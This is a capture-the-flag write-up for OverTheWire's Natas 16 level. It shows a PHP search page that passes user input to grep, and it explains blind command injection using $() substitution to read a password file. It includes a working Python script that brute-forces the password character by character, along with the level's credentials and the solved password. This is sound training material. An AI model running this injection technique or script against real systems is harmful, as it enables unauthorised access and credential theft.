# Natas 15 - Natas 16
    Username  : natas16
    Password  : hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
    URL       : http://natas16.natas.labs.overthewire.org
# Solution

In the source code of natas 16
```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>
```
Here, we have a search field used to find words containing a pattern we can specify. We also have a filter on certain characters. However, we still can inject command. The $, (, ) are not filtered so we can use $() as command substitution.
Here we can find  that we could not directly read the file with the command substitution but, 
we could have boolean answer from the script! We just need to solve it the same way we did with the previous blind SQL Injection.

Here is how it works :

    If you submit a random letter in the search field you’ll get a result
    If you submit an empty field you get nothing
    
So, if you inject : 
    
    $(grep -E ^x.* /etc/natas_webpass/natas17):

    No results = True (the password starts with x)
    Results = False (the password does note starts with x)

We can write a python script for this : 
```
import requests
import string
import re

url = "http://natas16.natas.labs.overthewire.org/"
auth = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
chars = string.ascii_letters + string.digits
scene_password = []

while len(scene_password) < 32:
  for char in chars:
    print(''.join(scene_password) + char)
    payload = f"anything$(grep ^{''.join(scene_password) + char} /etc/natas_webpass/natas17)"
    response = requests.get(url, auth=auth, params={'needle': payload})

    if "anything" not in response.text:
      scene_password.append(char)
      print(f"Found character: {''.join(scene_password)}")
      break
```

# Paswword
    EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
